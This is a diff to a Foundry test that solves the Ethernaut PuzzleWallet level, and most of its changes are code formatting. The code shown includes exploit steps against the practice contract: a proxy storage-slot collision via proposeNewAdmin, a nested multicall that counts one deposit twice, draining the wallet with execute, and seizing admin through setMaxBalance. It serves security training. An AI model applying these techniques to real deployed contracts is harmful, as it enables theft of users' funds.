@@ -6,7 +6,6 @@ import "forge-std/console.sol";
 import "../src/PuzzleWallet/PuzzleWalletFactory.sol";
 import "../src/Ethernaut.sol";
 
-// forge test --match-contract PuzzleWalletTest -vvvv
 contract PuzzleWalletTest is Test {
     Ethernaut ethernaut;
     address player = address(100);
@@ -14,7 +13,7 @@ contract PuzzleWalletTest is Test {
     function setUp() public {
         // create new instance of ethernaut
         ethernaut = new Ethernaut();
-        vm.deal(player, 5 ether); // give our address 5 ether
+        vm.deal(player, 5 ether); // give our player 5 ether
     }
 
     function testPuzzleWalletHack() public {
@@ -22,9 +21,16 @@ contract PuzzleWalletTest is Test {
          * Factory setup *
          *************** */
         PuzzleWalletFactory puzzleWalletFactory = new PuzzleWalletFactory();
-        (address levelAddressProxy, address levelAddressWallet) = puzzleWalletFactory.createInstance{value: 1 ether}();
-        PuzzleProxy ethernautPuzzleProxy = PuzzleProxy(payable(levelAddressProxy));
-        PuzzleWallet ethernautPuzzleWallet = PuzzleWallet(payable(levelAddressWallet));
+        (
+            address levelAddressProxy,
+            address levelAddressWallet
+        ) = puzzleWalletFactory.createInstance{value: 1 ether}();
+        PuzzleProxy ethernautPuzzleProxy = PuzzleProxy(
+            payable(levelAddressProxy)
+        );
+        PuzzleWallet ethernautPuzzleWallet = PuzzleWallet(
+            payable(levelAddressWallet)
+        );
         vm.startPrank(player);
         /****************
          *    Attack     *
@@ -101,7 +107,10 @@ contract PuzzleWalletTest is Test {
         depositSelector[0] = abi.encodeWithSignature("deposit()");
         bytes[] memory nestedMultiCall = new bytes[](2);
         nestedMultiCall[0] = abi.encodeWithSignature("deposit()");
-        nestedMultiCall[1] = abi.encodeWithSignature("multicall(bytes[])", depositSelector);
+        nestedMultiCall[1] = abi.encodeWithSignature(
+            "multicall(bytes[])",
+            depositSelector
+        );
         // -- 2 --
         ethernautPuzzleProxy.proposeNewAdmin(player);
         // -- 3 --
@@ -110,7 +119,7 @@ contract PuzzleWalletTest is Test {
         ethernautPuzzleWallet.multicall{value: 1 ether}(nestedMultiCall);
         // -- 5 --
         ethernautPuzzleWallet.execute(player, 2 ether, bytes(""));
-        assertEq(address(ethernautPuzzleWallet).balance,0); // make sure balance is drained
+        assertEq(address(ethernautPuzzleWallet).balance, 0); // make sure balance is drained
         // -- 6 --
         ethernautPuzzleWallet.setMaxBalance(uint256(uint160(player)));
 
